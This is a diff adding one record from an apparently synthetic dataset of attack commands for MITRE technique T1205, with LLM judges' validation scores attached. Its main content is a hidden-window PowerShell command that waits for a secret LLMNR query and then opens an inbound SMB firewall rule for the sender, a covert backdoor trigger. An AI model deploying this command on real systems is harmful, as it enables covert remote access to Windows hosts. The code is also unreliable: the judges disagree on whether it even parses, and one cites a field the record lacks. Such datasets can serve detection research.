@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(5355); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 20){ $p=12; $n=''; while($p -lt $d.Length){ $l=$d[$p]; if($l -eq 0){$p++; break}; $p++; $n += [Text.Encoding]::ASCII.GetString($d,$p,$l)+''.''; $p+=$l }; if($n -eq ''svc-open.''){ Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-LLMNR'' -Enabled True -RemoteAddress $ep.Address; break } } } }'",
+  "explanation": "Monitors LLMNR queries on UDP/5355 and parses the DNS-like question name. A query for the sentinel name 'svc-open.' acts as the signal, enabling an inbound SMB (445) firewall rule restricted to the sender.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/445.",
+    "Listen for LLMNR on UDP/5355 and parse QNAME from the wire format.",
+    "If QNAME equals 'svc-open.', enable the rule and scope to the signaling host."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-0b6721cd",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "Inner PowerShell script has improper single-quote escaping (e.g., $n='' should be $n='''' within the outer single-quoted string), causing a parse error despite otherwise balanced quoting/braces.",
+        "semantic_score": 2,
+        "semantic_justification": "Conceptually aligns with T1205 by using an LLMNR query as a signal to enable a firewall rule, but it is operationally implausible without admin rights for firewall changes and likely cannot bind to UDP/5355 due to the DNS Client service already using the port.",
+        "combined_score": 2.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T14:38:39.141521Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct PowerShell syntax for embedding a script block, and proper escaping of internal strings for `Invoke-WmiMethod`.",
+        "semantic_score": 2,
+        "semantic_justification": "While the LLMNR parsing and signaling logic correctly implements T1205, the command fails to achieve its claimed intent of modifying firewall rules because it explicitly states 'Privilege: None', which is insufficient for `New-NetFirewallRule` or `Set-NetFirewallRule` cmdlets.",
+        "combined_score": 3.5,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T14:39:04.077210Z"
+      }
+    ],
+    "llm_average_syntactic": 3.5,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 2.75,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
